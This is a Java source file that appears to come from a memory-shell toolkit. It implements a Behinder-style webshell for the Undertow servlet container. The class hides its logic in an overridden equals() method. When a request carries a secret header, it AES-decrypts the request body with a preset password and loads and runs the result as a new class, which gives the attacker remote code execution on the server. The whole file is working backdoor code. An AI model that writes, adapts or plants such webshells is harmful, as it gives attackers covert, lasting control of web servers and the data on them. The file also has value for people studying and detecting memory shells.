package com.reajason.javaweb.memshell.shelltool.behinder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderUndertowServletHandler extends ClassLoader {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public BehinderUndertowServletHandler() {
    }

    public BehinderUndertowServletHandler(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object servletRequestContext = null;
        if (args.length == 2) {
            servletRequestContext = args[1];
        } else {
            servletRequestContext = args[2];
        }
        try {
            Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
            Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                Object session = request.getClass().getMethod("getSession").invoke(request);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                Map<String, Object> map = new HashMap<String, Object>(3);
                map.put("request", request);
                map.put("response", unwrap(response));
                map.put("session", session);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                BufferedReader reader = (BufferedReader) request.getClass().getMethod("getReader").invoke(request);
                String parameter = reader.readLine();
                byte[] bytes = c.doFinal(base64Decode(parameter));
                Object instance = new BehinderUndertowServletHandler(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(map);
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj) {
        try {
            return getFieldValue(obj, "response");
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException();
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
}
